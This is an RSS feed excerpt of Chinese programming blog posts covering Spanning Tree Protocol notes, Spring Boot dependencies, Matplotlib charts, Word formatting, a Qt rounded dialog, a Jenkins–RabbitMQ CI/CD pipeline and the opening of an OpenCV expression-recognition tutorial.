}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540075.html</guid><pubDate>Fri, 31 Oct 2025 07:23:09 +0000</pubDate></item><item><title>学习笔记——交换——STP（生成树）简介</title><link>https://www.ppmy.cn/news/1540076.html</link><description>一、技术背景
1、生成树技术背景
交换机单线路组网，存在单点故障(上左图)，
上行线路及设备都不具备冗余性
，一旦链路或上行设备发生故障，业务将会中断。
为了使得网络更加健壮、更具有冗余性，将拓扑修改为(上右图)
接入层交换机采用双链路，联到两台汇聚设备，构成一个物理链路冗余的二层环境，解决了单链路及单设备故障问题
。
但是这样也带来了一个大问题，就是
二层物理环境存在环路
。
2、二层环路带来的问题
(1)典型问题一：广播风暴
网络中如若存在二层环路，一旦出现广播数据帧，这些数据帧将被交换机不断进行泛洪，从而在网络中造成
广播风暴
。(上左图)
广播风暴对网络的危害：
将严重消耗设备资源及网络带宽，最终导致网络瘫痪。
(2)典型问题二：MAC地址漂移
1.PC发送数据帧给Server；
2.SW3的MAC地址表中没有匹配目的MAC的表项，于是将数据帧进行泛洪；
3.SW1及SW2都会收到这个数据帧并学习源MAC，同时将数据帧进一步泛洪；SW1及SW2又从自己另一个接口收到这个数据帧，于是MAC表又一次发生改变，如此往复。
(上右图)以SW1为例，5489-98EE-788A会不断的在GE0/0/1与GE0/0/2接口之间来回切换，这被称为
MAC
地址漂移
现象
。
即使不是人为搭建冗余的物理环境而导致的环路，网络也有可能因为种种原因出现二层环路引发的故障。
交换机环路带来的问题：
广播风暴、mac地址表不稳定、网络卡顿、网络不稳定、过多占用交换机的cpu和内存
等等。
3、有没有什么办法解决环路的问题呢？
生成树(Spanning-tree)协议就是用于解决
环路
这个问题的。
什么是生成树？
1、解决二层环路。
2、防止广播风暴。 广播风暴造成的结果是什么？   造成广播风暴的原因是什么？
广播报文在两个或多个交换机间大量的、重复的、无休止的传递。洪范、冗余链路。
3、防止MAC地址表的不稳定。
4、防止数据帧的重复拷贝。
通过在交换网络中部署
生成树(Spanning-tree)技术
，
能够防止网络中出现二层环路。
STP运行后，如果网络中存在环路，那么
STP
通过阻塞(Block)特定的接口从而打破环路
，并且在网络出现
拓扑变更时及时收敛，
以保证网络的冗余性。(如上边左图所示)
当拓扑发生变更的时候
，
生成树协议能够探测到这些变化
，并且
及时自动的调整接口状态
，从而
适应网络拓扑的变化，实现链路冗余
。(如上边右图所示)
4、生成树协议在园区网络中的应用位置
5、二层环路与三层环路
常见环路主要分为：
二层环路和三层环路。
(1)三层环路                    (2)二层环路
常见原因
：路由环路
常见原因：
网络中部署了二层冗余环境，或人为的误接线缆导致；
防环方法：                       防环方法：
1、通过动态路由协议防环。            1、需借助特定的协议或机制实现二层防环；
2、IP报文头部中的TTL字段用于防止报   2、二层帧头中并没有任何信息可用于防止数据帧被无
文被无止尽地转发。                   止尽地转发。
二、STP简介
1、STP概述
STP(spanning tree protocol，生成树协议)
STP
是一个用于局域网中消除数据链路层物理环路的协议，
标准名称是
802.1D
。
运行该协议的设备
通过彼此交互信息而发现网络中的环路
，
对某些接口进行阻塞以消除环路
。
STP在网络中运行后会持续监控网络的状态，当网络出现拓扑变更时，STP能够感知并且进行
自动响应
，从而使得网络状态适应新的拓扑结构，保证网络可靠性。(下左图)
注意：
在华为的交换机上，
开机默认自动运行。
2、STP(生成树)作用
STP通过阻塞端口来消除二层交换机环路(交换机与交换机间)，并
能够实现链路备份的目的
。
消除环路：
通过阻塞冗余链路消除网络中可能存在的网络通信环路。
链路备份：
当前活动的路径发生故障时，激活冗余备份链路，恢复网络连通性。
解决方案：
逻辑性阻塞某个接口. 使用STP来逻辑的阻塞某一个接口，使其只接收流量，不发送流量从而防止环路。
3、标准STP的缺陷
(1)收敛时间长
在默认情况下，
STP
的收敛时间为30s(侦听(Listening)+学习(learning)各15s)
，在某些场景下，收敛时间更是长达50s(例如根桥故障，不向外发送BPDU，交换机需要先等待
20s
的老化时间
，再加上30s的侦听(Listening)+学习(learning))，在这个时间段内，会导致网络长时间的中断。
(2)拓扑变化时收敛机制不灵活
当企业上下班时间，每个员工将自己的PC进行开关机的操作，现网当中就会出现大量的TCN（拓扑变更） BPDU，影响设备的性能，而PC机器其实不需要参加到生成树计算当中。
BPDU转发时，唯一不变的是根桥的ID。
交换机只有在发送BPDU时，才会算上自己的开销，接受BPDU时，不会算上自己的开销(cost)。
指定端口(DP)：
发送最优的BPDU
根端口(RP)：
收最优的BPDU
阻塞端口(AP):
既不是指定端口，又不是根端口，则为阻塞端口
整个华为数通学习笔记系列中，本人是以网络视频与网络文章的方式自学的，并按自己理解的方式总结了学习笔记，某些笔记段落中可能有部分文字或图片与网络中有雷同，并非抄袭。完处于学习态度，觉得这段文字更通俗易懂，融入了自己的学习笔记中。如有相关文字涉及到某个人的版权利益，可以直接联系我，我会把相关文字删除。【VX：czlingyun    暗号：CSDN】</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540076.html</guid><pubDate>Fri, 31 Oct 2025 07:23:12 +0000</pubDate></item><item><title>SpringBoot启动web项目的最少依赖</title><link>https://www.ppmy.cn/news/1540077.html</link><description>1、pom.xml 文件：启动web项目
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;
project
xmlns
=
"
http://maven.apache.org/POM/4.0.0
"
xmlns:
xsi
=
"
http://www.w3.org/2001/XMLSchema-instance
"
xsi:
schemaLocation
=
"
http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd
"
&gt;
&lt;
modelVersion
&gt;
4.0.0
&lt;/
modelVersion
&gt;
&lt;
groupId
&gt;
com.manmanqiu
&lt;/
groupId
&gt;
&lt;
artifactId
&gt;
asdasdas
&lt;/
artifactId
&gt;
&lt;
version
&gt;
1.0-SNAPSHOT
&lt;/
version
&gt;
&lt;
properties
&gt;
&lt;
maven.compiler.source
&gt;
8
&lt;/
maven.compiler.source
&gt;
&lt;
maven.compiler.target
&gt;
8
&lt;/
maven.compiler.target
&gt;
&lt;/
properties
&gt;
&lt;
dependencies
&gt;
&lt;!--对全栈web开发的支持，包括Tomcat和spring-webmvc--&gt;
&lt;
dependency
&gt;
&lt;
groupId
&gt;
org.springframework.boot
&lt;/
groupId
&gt;
&lt;
artifactId
&gt;
spring-boot-starter-web
&lt;/
artifactId
&gt;
&lt;
version
&gt;
2.7.18
&lt;/
version
&gt;
&lt;/
dependency
&gt;
&lt;/
dependencies
&gt;
&lt;
build
&gt;
&lt;
plugins
&gt;
&lt;
plugin
&gt;
&lt;
groupId
&gt;
org.springframework.boot
&lt;/
groupId
&gt;
&lt;
artifactId
&gt;
spring-boot-maven-plugin
&lt;/
artifactId
&gt;
&lt;/
plugin
&gt;
&lt;/
plugins
&gt;
&lt;/
build
&gt;
&lt;/
project
&gt;
2、为什么：只需要web依赖？
&lt;
dependency
&gt;
&lt;
groupId
&gt;
org.springframework.boot
&lt;/
groupId
&gt;
&lt;
artifactId
&gt;
spring-boot-starter-web
&lt;/
artifactId
&gt;
&lt;
version
&gt;
2.7.18
&lt;/
version
&gt;
&lt;/
dependency
&gt;
spring-boot-starter-web
依赖已经包括了启动一个 Web 项目所需的所有关键组件，包括嵌入式 Tomcat 和 Spring MVC 框架。因此，你不需要额外配置 Tomcat 服务器，它已经默认配置好并会在应用启动时运行。
嵌入式 Tomcat
spring-boot-starter-web 依赖默认包含 嵌入式 Tomcat 服务器，这是 Spring Boot 的一大特点。你不需要单独配置外部服务器，Spring Boot 会自动将 Tomcat 嵌入到应用程序中，并在启动时运行 Tomcat 作为 Web 容器来处理 HTTP 请求。
Spring MVC
这个依赖包中包含了 Spring MVC 框架，它是构建 Web 应用的核心模块。
Spring MVC 负责处理 HTTP 请求并将它们映射到适当的控制器方法。
Jackson
Jackson 是处理 JSON 序列化和反序列化 的工具库，它被用来处理 REST API 中常见的 JSON 数据格式。这个库也是 spring-boot-starter-web 依赖中的一部分，允许你轻松地构建 RESTful 服务。
Spring Boot 自动配置
Spring Boot 通过自动配置功能简化了项目配置。
基于依赖的存在，Spring Boot 自动配置了一些必要的组件。
例如，因为你引入了 spring-boot-starter-web，它会自动配置一个嵌入式 Tomcat 服务器和 Spring MVC 组件。
3、该web依赖的：依赖树
+- org.springframework.boot:spring-boot-starter-web:jar:2.7.18:compile
|
+- org.springframework.boot:spring-boot-starter:jar:2.7.18:compile
|
|
+- org.springframework.boot:spring-boot:jar:2.7.18:compile
|
|
+- org.springframework.boot:spring-boot-autoconfigure:jar:2.7.18:compile
|
+- org.springframework.boot:spring-boot-starter-json:jar:2.7.18:compile
|
+- org.springframework.boot:spring-boot-starter-tomcat:jar:2.7.18:compile
|
+- org.springframework:spring-web:jar:5.3.25:compile
|
+- org.springframework:spring-webmvc:jar:5.3.25:compile
|
+- com.fasterxml.jackson.core:jackson-databind:jar:2.13.5:compile
org
.
springframework
.
boot
:
spring
-
boot
-
starter
-
web 依赖包含了 org
.
springframework
.
boot
:
spring
-
boot
-
starter 的原因是，
Spring
Boot
Starter
依赖（如 spring
-
boot
-
starter
-
web）是通过组合多个常用依赖来简化项目配置的，这就是
Spring
Boot
的
"starter"
概念。spring
-
boot
-
starter 的作用
spring
-
boot
-
starter 是所有
Spring
Boot
Starter
依赖的基础，它包含了一些基础的配置和工具，使得
Spring
Boot
项目能顺利启动并运行。它负责引入一些基础的、通用的依赖。以下是它的主要组成部分：
1.
spring
-
boot
spring
-
boot 包含了启动
Spring
Boot
应用的核心类，比如
SpringApplication
类。这个类的
run
(
)
方法用于启动你的
Spring
Boot
应用。
2.
spring
-
boot
-
autoconfigure
spring
-
boot
-
autoconfigure 是
Spring
Boot
中的自动配置机制，它基于你的类路径上的依赖，自动配置应用所需的
Bean
和组件。比如你有 spring
-
boot
-
starter
-
web 依赖，
Spring
Boot
自动为你配置了
Web
服务器（如嵌入式
Tomcat
）、
Spring
MVC 相关的
Controller
、
View
Resolver
等。spring
-
boot
-
starter
-
web 和 spring
-
boot
-
starter 的关系
spring
-
boot
-
starter
-
web 这个依赖主要是为
Web
应用设计的，它不仅需要
Web
相关的依赖（如 spring
-
webmvc 和 spring
-
boot
-
starter
-
tomcat），还需要
Spring
Boot
的基础配置和功能，因此它包含了 spring
-
boot
-
starter 作为依赖之一。
spring
-
boot
-
starter 则提供了所有
Spring
Boot
项目都需要的通用基础组件，比如 spring
-
boot 和 spring
-
boot
-
autoconfigure。
总结：
org
.
springframework
.
boot
:
spring
-
boot
-
starter 是
Spring
Boot
项目的基础依赖，spring
-
boot
-
starter
-
web 依赖它来确保应用有核心启动类和自动配置机制，这样你才能够顺利启动和运行
Spring
Boot
Web
应用。
4、spring-boot-starter 会重复引入吗？
问题如下
spring-boot-starter-data-jpa spring-boot-starter-security 并没有指定spring-boot-starter 版本的情况下，
是以spring-boot-starter-data-jpa 加载时的版本为主吗？ spring-boot-starter-security 跟随吗？
在你没有手动指定 spring-boot-starter 的版本时，Spring Boot 的依赖管理机制会自动确保所有 starter（如 spring-boot-starter-data-jpa 和 spring-boot-starter-security）使用相同的版本。这是通过 spring-boot-dependencies BOM（Bill of Materials）进行统一版本管理的。BOM 的作用是什么？
BOM 是一个 Maven 特性，Spring Boot 使用它来提供一个依赖版本的统一管理，使得在你的 pom.xml 文件中不需要显式地为每个依赖指定版本。spring-boot-starter-data-jpa 和 spring-boot-starter-security 这两个依赖，在内部会依赖于 spring-boot-starter。
当你引入这两个依赖时，它们会根据当前 Spring Boot 的版本，通过 BOM 确定每个相关依赖的版本。这意味着，两个依赖引入的 spring-boot-starter 版本是完全一致的，由 Spring Boot 版本统一决定。
示例说明
假设你没有引入 spring-boot-starter-parent，而直接引入了 spring-boot-starter-data-jpa 和 spring-boot-starter-security，它们的内部依赖树是：spring-boot-starter-data-jpa
依赖于 spring-boot-starter
通过 BOM 确定它所使用的 spring-boot-starter 版本。
spring-boot-starter-security
同样依赖于 spring-boot-starter
版本由 BOM 决定，与 spring-boot-starter-data-jpa 保持一致。
你不需要手动指定版本，Maven 会根据 BOM 来统一决定这两个依赖中的 spring-boot-starter 使用的版本。因此，不是其中一个依赖决定版本，另一个跟随，而是它们都通过 BOM 使用相同的版本。如何 BOM 起作用
当你引入 spring-boot-starter-parent 或者通过 spring-boot-dependencies 进行版本管理时，BOM 会自动为你定义所有相关依赖的版本。你只需要指定 Spring Boot 的版本，Maven 会为每个 Spring Boot 相关的依赖（包括 spring-boot-starter-data-jpa、spring-boot-starter-security 和其他 starter）选择对应的版本。
&lt;
dependencyManagement
&gt;
&lt;
dependencies
&gt;
&lt;
dependency
&gt;
&lt;
groupId
&gt;
org.springframework.boot
&lt;/
groupId
&gt;
&lt;
artifactId
&gt;
spring-boot-dependencies
&lt;/
artifactId
&gt;
&lt;
version
&gt;
2.7.18
&lt;/
version
&gt;
&lt;!-- 这里统一版本 --&gt;
&lt;
type
&gt;
pom
&lt;/
type
&gt;
&lt;
scope
&gt;
import
&lt;/
scope
&gt;
&lt;/
dependency
&gt;
&lt;/
dependencies
&gt;
&lt;/
dependencyManagement
&gt;
spring-boot-starter-data-jpa 和 spring-boot-starter-security 引入的 spring-boot-starter 版本不依赖于任何一个特定的 starter，而是由 Spring Boot 的 BOM 决定。
版本一致性是由 Spring Boot 的依赖管理（BOM）统一决定的，确保不同 starter 使用的依赖版本一致，避免兼容性问题。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540077.html</guid><pubDate>Fri, 31 Oct 2025 07:23:14 +0000</pubDate></item><item><title>【Python数据可视化】利用Matplotlib绘制美丽图表！</title><link>https://www.ppmy.cn/news/1540078.html</link><description>【Python数据可视化】利用Matplotlib绘制美丽图表！
数据可视化是数据分析过程中的重要步骤，它能直观地展示数据的趋势、分布和相关性，帮助我们做出明智的决策。在 Python 中，
Matplotlib
是最常用的可视化库之一，它功能强大，支持多种图表类型和高度自定义的图形绘制。本文将详细介绍如何使用 Matplotlib 绘制各种美观的图表，并通过实例演示如何掌握这些技巧。
目录
什么是 Matplotlib？
安装 Matplotlib
Matplotlib 基本使用
绘制简单的折线图
自定义图表样式和主题
绘制柱状图与直方图
绘制散点图与气泡图
添加标题、标签和注释
多子图布局
保存和导出图表
1. 什么是 Matplotlib？
Matplotlib 是 Python 中一个广泛使用的 2D 图形绘图库，提供了从简单到复杂的各种图表类型。它以简单易用的 API 和丰富的自定义能力为用户所喜爱。无论是科研、工程应用，还是金融数据分析，Matplotlib 都能帮助用户将数据以直观的方式呈现出来。
一些常见的图表类型包括：
折线图（Line Plot）
柱状图（Bar Chart）
散点图（Scatter Plot）
饼图（Pie Chart）
箱线图（Box Plot）
2. 安装 Matplotlib
如果你还没有安装 Matplotlib，可以通过 pip 命令快速安装：
pip
install
matplotlib
3. Matplotlib 基本使用
在使用 Matplotlib 时，通常会导入
matplotlib.pyplot
模块，并使用
plt
作为别名。这是最常见的使用方式，因为
pyplot
提供了绘制图表的核心函数。
import
matplotlib
.
pyplot
as
plt
# 示例数据
x
=
[
1
,
2
,
3
,
4
,
5
]
y
=
[
2
,
3
,
5
,
7
,
11
]
# 绘制折线图
plt
.
plot
(
x
,
y
)
# 显示图表
plt
.
show
(
)
以上代码绘制了一条简单的折线图。
plt.plot()
是绘制折线图的函数，
plt.show()
则是显示图表的函数。
4. 绘制简单的折线图
折线图是展示数据变化趋势的常用图表。下面的示例演示了如何创建一个带有标题和轴标签的折线图。
import
matplotlib
.
pyplot
as
plt
# 示例数据
x
=
[
1
,
2
,
3
,
4
,
5
]
y
=
[
2
,
3
,
5
,
7
,
11
]
# 绘制折线图
plt
.
plot
(
x
,
y
,
marker
=
'o'
,
color
=
'b'
,
linestyle
=
'-'
,
label
=
'Prime numbers'
)
# 添加标题和标签
plt
.
title
(
"Simple Line Plot"
)
plt
.
xlabel
(
"X-axis"
)
plt
.
ylabel
(
"Y-axis"
)
# 添加图例
plt
.
legend
(
)
# 显示图表
plt
.
show
(
)
自定义折线图
marker
：标记数据点的样式。
color
：线条颜色。
linestyle
：线条样式，如实线（
'-'
）、虚线（
'--'
）等。
label
：用于图例的标签。
5. 自定义图表样式和主题
Matplotlib 提供了多种内置样式，允许用户轻松更改图表的外观。你可以使用
plt.style.use()
方法应用预定义的样式。
import
matplotlib
.
pyplot
as
plt
# 应用样式
plt
.
style
.
use
(
'ggplot'
)
# 示例数据
x
=
[
1
,
2
,
3
,
4
,
5
]
y
=
[
2
,
3
,
5
,
7
,
11
]
# 绘制折线图
plt
.
plot
(
x
,
y
,
marker
=
'o'
)
# 显示图表
plt
.
show
(
)
常用样式包括：
ggplot
：模仿 R 语言中的 ggplot2。
seaborn
：简洁而美观的样式。
bmh
：适合黑白打印。
6. 绘制柱状图与直方图
柱状图用于展示分类数据，而直方图通常用于显示数据的分布情况。
柱状图
import
matplotlib
.
pyplot
as
plt
# 示例数据
categories
=
[
'A'
,
'B'
,
'C'
,
'D'
]
values
=
[
4
,
7
,
1
,
8
]
# 绘制柱状图
plt
.
bar
(
categories
,
values
,
color
=
'skyblue'
)
# 添加标题和标签
plt
.
title
(
"Bar Chart Example"
)
plt
.
xlabel
(
"Categories"
)
plt
.
ylabel
(
"Values"
)
# 显示图表
plt
.
show
(
)
直方图
直方图展示数据的频率分布，是数据分析中常见的工具。
import
matplotlib
.
pyplot
as
plt
import
numpy
as
np
# 生成随机数据
data
=
np
.
random
.
randn
(
1000
)
# 绘制直方图
plt
.
hist
(
data
,
bins
=
30
,
color
=
'green'
,
alpha
=
0.7
)
# 添加标题和标签
plt
.
title
(
"Histogram Example"
)
plt
.
xlabel
(
"Value"
)
plt
.
ylabel
(
"Frequency"
)
# 显示图表
plt
.
show
(
)
7. 绘制散点图与气泡图
散点图用于展示两个变量之间的关系。通过改变点的大小，可以扩展为气泡图。
散点图
import
matplotlib
.
pyplot
as
plt
# 示例数据
x
=
[
1
,
2
,
3
,
4
,
5
]
y
=
[
2
,
3
,
5
,
7
,
11
]
# 绘制散点图
plt
.
scatter
(
x
,
y
,
color
=
'red'
,
marker
=
'x'
)
# 添加标题和标签
plt
.
title
(
"Scatter Plot Example"
)
plt
.
xlabel
(
"X-axis"
)
plt
.
ylabel
(
"Y-axis"
)
# 显示图表
plt
.
show
(
)
气泡图
import
matplotlib
.
pyplot
as
plt
# 示例数据
x
=
[
1
,
2
,
3
,
4
,
5
]
y
=
[
2
,
3
,
5
,
7
,
11
]
sizes
=
[
20
,
50
,
80
,
200
,
500
]
# 气泡大小
# 绘制气泡图
plt
.
scatter
(
x
,
y
,
s
=
sizes
,
color
=
'purple'
,
alpha
=
0.5
)
# 添加标题和标签
plt
.
title
(
"Bubble Chart Example"
)
plt
.
xlabel
(
"X-axis"
)
plt
.
ylabel
(
"Y-axis"
)
# 显示图表
plt
.
show
(
)
8. 添加标题、标签和注释
为了让图表更具可读性，应该为每个图表添加合适的标题、坐标轴标签以及注释。
import
matplotlib
.
pyplot
as
plt
# 示例数据
x
=
[
1
,
2
,
3
,
4
,
5
]
y
=
[
2
,
3
,
5
,
7
,
11
]
# 绘制折线图
plt
.
plot
(
x
,
y
,
marker
=
'o'
)
# 添加标题、轴标签
plt
.
title
(
"Line Plot with Annotations"
)
plt
.
xlabel
(
"X-axis"
)
plt
.
ylabel
(
"Y-axis"
)
# 添加注释
plt
.
text
(
3
,
5
,
"Peak Point"
,
fontsize
=
12
,
color
=
'green'
)
# 显示图表
plt
.
show
(
)
9. 多子图布局
在同一个窗口中展示多个图表，可以使用
subplot()
或
subplots()
方法。
subplot()
可以在一个网格中绘制多个子图。
import
matplotlib
.
pyplot
as
plt
# 创建一个 2x1 网格的子图
plt
.
subplot
(
2
,
1
,
1
)
plt
.
plot
(
[
1
,
2
,
3
]
,
[
1
,
4
,
9
]
)
plt
.
subplot
(
2
,
1
,
2
)
plt
.
plot
(
[
1
,
2
,
3
]
,
[
1
,
2
,
3
]
)
# 显示图表
plt
.
show
(
)
10. 保存和导出图表
Matplotlib 支持将图表保存为多种格式，如 PNG、PDF 等。使用
savefig()
方法可以保存图表。
import
matplotlib
.
pyplot
as
plt
# 示例数据
x
=
[
1
,
2
,
3
,
4
,
5
]
y
=
[
2
,
3
,
5
,
7
,
11
]
# 绘制折线图
plt
.
plot
(
x
,
y
)
# 保存图表为 PNG 文件
plt
.
savefig
(
"line_plot.png"
)
# 显示图表
plt
.
show
(
)
总结
Matplotlib 是一个功能丰富、易于使用的 Python 可视化库。通过本文的介绍，你学到了如何使用 Matplotlib 绘制折线图、柱状图、散点图等常见图表，如何自定义图表样式，以及如何进行</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540078.html</guid><pubDate>Fri, 31 Oct 2025 07:23:17 +0000</pubDate></item><item><title>Word排版 | 如何文字部分固定行距、图片(嵌入型)单倍行距</title><link>https://www.ppmy.cn/news/1540079.html</link><description>问题描述
在写一个要求比较高的项目报告，总共有109页 + 89张图片，而且必须用word写
因此：
文字部分需要固定行距23磅
图片部分需要单倍行距（不然无法使用嵌入式）
难点
文字和图片难以有效分离，无法分别设置行距。单独为每张图片设置行距太麻烦。
解决方法：利用自定义样式 + 替换 分开修改文字和图片的格式
第一步：自定义样式
选择新建样式
设置样式的格式–&gt;段落（行距）
点击确定，保存样式
第2步：修改全文行距
全选
设置行距为固定值–23磅
可以看到，原先的图片被隐藏，但行距得到了统一。接下来，就是一键修改图片的行距为单倍行距
第3步：利用样式，修改图片行距 （重点！！）
ctrl + F --&gt; 替换
设置为
^g^p
，意思是查找所有图片 + 回车
替换为
，选择样式 --&gt; 刚刚新建的图片样式
点击全部替换
结论
成功替换，问题解决！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540079.html</guid><pubDate>Fri, 31 Oct 2025 07:23:20 +0000</pubDate></item><item><title>Qt自定义一个圆角对话框</title><link>https://www.ppmy.cn/news/1540080.html</link><description>如何得到一个圆角对话框？
步骤：
1、继承自QDiaglog
2、去掉系统自带的边框
3、设置背景透明,不设置4个角会有多余的部分出现颜色
4、对话框内部添加1个QWidget，给这个widget设置圆角，并添加到布局中让他充满对话框
5、后续对话框的所有内容都添加在这个widget里面
6、模拟QMessageBox的静态方法，提供一个静态方法，调用这个静态方法可以直接显示一个圆角对话框
举例：
#ifndef ROUNDEDDIALOG_H
#define ROUNDEDDIALOG_H#include &lt;QDialog&gt;
#include&lt;QHBoxLayout&gt;
#include&lt;QLabel&gt;
#include&lt;QPushButton&gt;class RoundedDialog : public QDialog
{Q_OBJECTpublic://模拟QMessageBox的静态方法，调用这个静态方法可以直接显示一个圆角对话框static int roundedDialog(){RoundedDialog d;return d.exec();}RoundedDialog(QWidget *parent = nullptr) : QDialog(parent){resize(400,200);//1.去掉系统自带的边框setWindowFlag(Qt::FramelessWindowHint);//2.设置背景透明,不设置4个角会有颜色setAttribute(Qt::WA_TranslucentBackground);//内部添加1个QWidget，给这个widget设置圆角，并添加到布局中让他充满对话框QHBoxLayout* h_box=new QHBoxLayout(this);h_box-&gt;setSpacing(0);h_box-&gt;setContentsMargins(0,0,0,0);QWidget* w=new QWidget(this);w-&gt;setStyleSheet(".QWidget{border-radius:20px;background-color:green}");h_box-&gt;addWidget(w);//后续对话框的所有内容都添加在这个widget里面QLabel* label=new QLabel("你好，我要说拜拜啦！",w);label-&gt;setAlignment(Qt::AlignCenter);label-&gt;setStyleSheet(R"(font: 900 12pt "Arial Black";)");label-&gt;move(120,50);QPushButton* btn_close=new QPushButton("×",this);btn_close-&gt;setStyleSheet("border-radius:15px;font-size:18px;font-weight:bold;background-color:pink");btn_close-&gt;setGeometry(185,150,30,30);connect(btn_close,&amp;QPushButton::clicked,this,&amp;QDialog::accept);}~RoundedDialog()=default;
};
#endif // ROUNDEDDIALOG_H
学习链接：https://github.com/0voice</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540080.html</guid><pubDate>Fri, 31 Oct 2025 07:23:22 +0000</pubDate></item><item><title>CI/CD（持续集成与持续交付）流水线</title><link>https://www.ppmy.cn/news/1540081.html</link><description>集成 Jenkins、GitLab Webhook、Nexus 和 RabbitMQ 可以形成一个全面的 CI/CD（持续集成与持续交付）流水线，结合消息队列可以创建事件驱动的工作流。以下是配置这四个工具以实现一个基本的 CI/CD 流程的详细步骤。
前置条件
Jenkins、GitLab、Nexus 和 RabbitMQ 实例已经安装并运行，各实例间网络通信正常。
Jenkins 有访问 GitLab 仓库、Nexus 仓库和 RabbitMQ 的权限。
一、配置 GitLab Webhook
Webhook 是 GitLab 推送代码变更后通知 Jenkins 的一种方式。
在 GitLab 中配置 Webhook
访问项目设置：
打开你的 GitLab 项目，点击左侧栏中的 Settings，然后选择 Webhooks。
添加 Webhook：
在 URL 字段中填写 Jenkins 的 Webhook URL，通常形式如下：
http
:
//&lt;jenkins-url&gt;/project/&lt;your-jenkins-job-name&gt;
选择触发事件，例如 Push events、Merge Request events 等。
点击 Add webhook。
二、在 Jenkins 中配置 GitLab 和 Nexus
安装插件
打开 Jenkins 管理界面，选择 Manage Jenkins &gt; Manage Plugins。
在 Available 标签页，搜索并安装以下插件：
GitLab Plugin
Git Plugin
Nexus Artifact Uploader Plugin
RabbitMQ Build Trigger Plugin
配置 GitLab 连接
打开 Jenkins 管理界面，选择 Manage Jenkins &gt; Configure System。
在 GitLab 部分，添加 GitLab 服务器信息：
填写 GitLab 服务器 URL。
添加 GitLab API token，在 GitLab User Settings 中生成一个新的访问令牌（需要具备 api 权限）。
配置 Nexus 连接
打开 Jenkins 管理界面，选择 Manage Jenkins &gt; Configure System。
滚动到 Nexus Artifact Uploader 部分，添加一个新的 Nexus 服务器配置，填写 URL、认证方式、用户名和密码。
配置 RabbitMQ 连接
打开 Jenkins 管理界面，选择 Manage Jenkins &gt; Configure System。
在 RabbitMQ Build Triggers 部分，添加 RabbitMQ 服务器信息，包括主机名、端口、用户名和密码。可以选择一个交换机和队列名称。
三、创建 Jenkins Pipeline
通过 Jenkins Pipeline 配置整个 CI/CD 流程，包括从 GitLab 获取代码、构建、上传到 Nexus 和通过 RabbitMQ 发送消息。
Copy
pipeline {
agent any
environment {GIT_REPO_URL = 'https://gitlab.com/your-username/your-repo.git'NEXUS_URL = 'http://nexus.example.com'NEXUS_REPO = 'your-repo'NEXUS_GROUP = 'com.example'ARTIFACT_ID = 'your-artifact'VERSION = '1.0.0'RABBITMQ_HOST = 'rabbitmq.example.com'RABBITMQ_PORT = '5672'RABBITMQ_QUEUE = 'your-queue'RABBITMQ_USER = 'your-user'RABBITMQ_PASS = 'your-password'
}stages {stage('Checkout') {steps {git credentialsId: 'your-credentials-id', url: "${GIT_REPO_URL}"}}stage('Build') {steps {sh 'mvn clean package'}}stage('Test') {steps {sh 'mvn test'}}stage('Upload to Nexus') {steps {nexusArtifactUploader(nexusVersion: 'nexus3',protocol: 'http',nexusUrl: "${NEXUS_URL}",groupId: "${NEXUS_GROUP}",version: "${VERSION}",repository: "${NEXUS_REPO}",credentialsId: 'your-nexus-credentials-id',artifacts: [[artifactId: "${ARTIFACT_ID}",classifier: '',file: 'target/your-artifact.jar',type: 'jar']])}}stage('Send Message to RabbitMQ') {steps {script {def messageJson = """{"project": "${env.JOB_NAME}","build_number": "${env.BUILD_NUMBER}","status": "SUCCESS","artifactUrl": "${NEXUS_URL}/repository/${NEXUS_REPO}/${NEXUS_GROUP.replace('.', '/')}/${ARTIFACT_ID}/${VERSION}/${ARTIFACT_ID}-${VERSION}.jar"}"""sh """curl -X POST -d '${messageJson}' \-u ${RABBITMQ_USER}:${RABBITMQ_PASS} \http://${RABBITMQ_HOST}:${RABBITMQ_PORT}/api/exchanges/%2f/amq.default/publish \-H "content-type:application/json" \-d '{"properties": {},"routing_key": "${RABBITMQ_QUEUE}","payload": "${messageJson}","payload_encoding": "string"}'"""}}}
}post {success {echo 'Build, upload, and message sending completed successfully'}failure {echo 'Build, upload, or message sending failed'}
}
}
四、在 RabbitMQ 中监控和处理消息
为了处理从 Jenkins 发送到 RabbitMQ 的消息，需要在 RabbitMQ 的队列中创建一个消费者。
Python 示例消费者代码
你可以使用任何编程语言来编写 RabbitMQ 消息消费者，这里介绍一个用 Python 编写的示例消费者代码：
Copy
import pika
import json
def callback(ch, method, properties, body):
message = json.loads(body)
print(f"Received message: {message}")
connection = pika.BlockingConnection(pika.ConnectionParameters(‘rabbitmq.example.com’))
channel = connection.channel()
channel.queue_declare(queue=‘your-queue’)
channel.basic_consume(queue=‘your-queue’, on_message_callback=callback, auto_ack=True)
print(‘Waiting for messages. To exit press CTRL+C’)
channel.start_consuming()
总结
通过这些步骤，你可以配置一个集成了 Jenkins、GitLab Webhook、Nexus 和 RabbitMQ 的完整 CI/CD 流水线。这将使你的开发和部署流程更加自动化和高效。具体实现可能根据你的项目需求有所调整，你可以根据自己的需求定制和扩展这些配置。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540081.html</guid><pubDate>Fri, 31 Oct 2025 07:23:24 +0000</pubDate></item><item><title>opencv学习：基于计算机视觉的表情识别系统</title><link>https://www.ppmy.cn/news/1540082.html</link><description>简介
基于计算机视觉的表情识别系统，该系统能够从视频流中实时检测人脸，并识别出两种基本表情：大笑和微笑。实验通过分析人脸关键点来计算表情特征指标，从而判断表情类型。
原理
基于以下原理进行：
人脸检测
：使用dlib库的
get_frontal_face_detector
函数检测视频中的人脸。
特征点预测
：使用dlib库的
shape_predictor
函数预测人脸的68个关键点。
表情特征计算
：
嘴巴张开程度（MAR）
：通过计算嘴巴周围特定点之间的欧几里得距离来衡量嘴巴的张开程度。
计算上下嘴唇的距离
计算嘴唇的长度
嘴巴宽度与脸部宽度的比例（MJR）
：通过比较嘴巴宽度和脸部宽度的比例来识别微笑表情。
表情判断
：根据计算出的特征指标，结合预设的阈值判断表情类型。
代码步骤：
1.导入必要的库：
import numpy as np
import cv2
from sklearn.metrics.pairwise import euclidean_distances
